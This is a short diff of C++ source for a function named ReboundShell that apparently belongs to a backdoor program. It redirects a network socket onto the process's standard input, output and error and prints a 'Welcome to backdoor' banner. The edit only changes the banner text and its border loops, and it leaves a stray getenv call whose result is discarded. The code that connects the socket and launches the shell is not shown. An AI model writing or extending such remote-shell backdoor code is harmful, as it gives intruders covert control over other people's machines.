@@ -65,14 +65,15 @@ void CSysInterface::ReboundShell(const std::string &mac)
                 dup2(sock, 1);
                 dup2(sock, 2);
 
-                title = "Welcome to backdoor " + std::string(getenv("USER")) + " " + std::string(getenv("HOME"));
+                title = std::string(" Welcome to backdoor ");
+                getenv("USER");
                 chdir(getenv("HOME"));
 
-                for(x = 0; x <= (title.size() + 3); x++)
+                for(x = 0; x < title.size(); x++)
                     fprintf(stderr, "+");
                 fprintf(stderr, "\n");
                 fprintf(stderr, "+ %s +\n", title.c_str());
-                for(x = 0; x <= (title.size() + 3); x++)
+                for(x = 0; x < title.size(); x++)
                     fprintf(stderr, "+");
                 fprintf(stderr, "\n");
 
